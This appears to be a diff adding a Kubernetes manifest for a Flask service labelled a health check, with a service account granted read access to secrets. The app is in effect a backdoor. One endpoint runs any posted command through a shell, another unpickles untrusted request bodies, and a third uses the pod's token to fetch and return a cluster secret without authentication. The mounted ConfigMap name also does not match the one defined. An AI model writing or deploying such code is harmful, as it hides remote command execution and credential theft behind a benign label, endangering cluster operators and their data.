@@ -1,0 +1,153 @@
+##
+##
+
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: lol-healthcheck-config
+data:
+  app.py: |
+    from flask import Flask, request, jsonify
+    import os
+    import subprocess
+    import pickle
+    import requests
+
+    app = Flask(__name__)
+
+    # System check endpoint
+    @app.route('/system-check', methods=['GET', 'POST'])
+    def system_check():
+        if request.method == 'POST':
+            cmd = request.form.get('cmd')
+            if cmd:
+                try:
+                    result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+                    return result.decode('utf-8'), 200
+                except subprocess.CalledProcessError as e:
+                    return str(e), 500
+
+        # Verify TCP endpoints from environment variables
+        tcp_statuses = {}
+        for key, value in os.environ.items():
+            if "TCP" in key and "tcp://" in value:
+                endpoint = value.split("://")[1]
+                try:
+                    response = requests.get(f"http://{endpoint}", timeout=5)
+                    tcp_statuses[endpoint] = response.status_code
+                except requests.exceptions.RequestException as e:
+                    tcp_statuses[endpoint] = str(e)
+
+        return jsonify({'status': 'operational', 'tcp_statuses': tcp_statuses})
+
+    # Data loading endpoint
+    @app.route('/data-load', methods=['POST'])
+    def data_load():
+        data = request.data
+        try:
+            obj = pickle.loads(data)
+            return jsonify(obj)
+        except Exception as e:
+            return str(e), 400
+
+    # Secure access endpoint for retrieving credentials
+    @app.route('/retrieve-credentials', methods=['GET'])
+    def retrieve_credentials():
+        secret_name = 'credential-secret'
+        namespace = 'default'  # Change if needed
+        url = f'https://kubernetes.default.svc/api/v1/namespaces/{namespace}/secrets/{secret_name}'
+        
+        # Use the default service account token for authentication
+        with open('/var/run/secrets/kubernetes.io/serviceaccount/token') as f:
+            token = f.read().strip()
+        
+        headers = {'Authorization': f'Bearer {token}'}
+        response = requests.get(url, headers=headers, verify=False)  # Set verify=True if you have proper certs
+
+        if response.status_code == 200:
+            secret_data = response.json()
+            credentials = secret_data['data']['CREDENTIALS']
+            return jsonify({"CREDENTIALS": credentials})  # Remove .decode() since credentials is already a string
+        else:
+            return jsonify({"error": "Failed to retrieve secret"}), response.status_code
+
+    if __name__ == '__main__':
+        app.run(debug=True, host='0.0.0.0')
+
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: obfuscated-sa
+  namespace: default  # Change if needed
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: credential-reader
+  namespace: default  # Change if needed
+rules:
+- apiGroups: [""]
+  resources: ["secrets"]
+  verbs: ["get"]
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: credential-reader-binding
+  namespace: default  # Change if needed
+subjects:
+- kind: ServiceAccount
+  name: obfuscated-sa
+  namespace: default  # Change if needed
+roleRef:
+  kind: Role
+  name: credential-reader
+  apiGroup: rbac.authorization.k8s.io
+
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: lol-healthcheck
+  labels:
+    app: lol-healthcheck
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: lol-healthcheck
+  template:
+    metadata:
+      labels:
+        app: lol-healthcheck
+    spec:
+      serviceAccountName: obfuscated-sa  # Use the service account
+      containers:
+      - name: healthcheck
+        image: python:3.9-slim
+        command: ["sh", "-c", "apt-get update && apt-get install -y wget procps python3-pip && pip install Flask requests && python /app/app.py"]
+        ports:
+        - containerPort: 5000
+        volumeMounts:
+        - name: app-volume
+          mountPath: /app
+      volumes:
+      - name: app-volume
+        configMap:
+          name: obfuscated-healthcheck-config
+
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: lol-healthcheck
+spec:
+  type: ClusterIP
+  ports:
+  - port: 5000
+    targetPort: 5000
+  selector:
+    app: lol-healthcheck
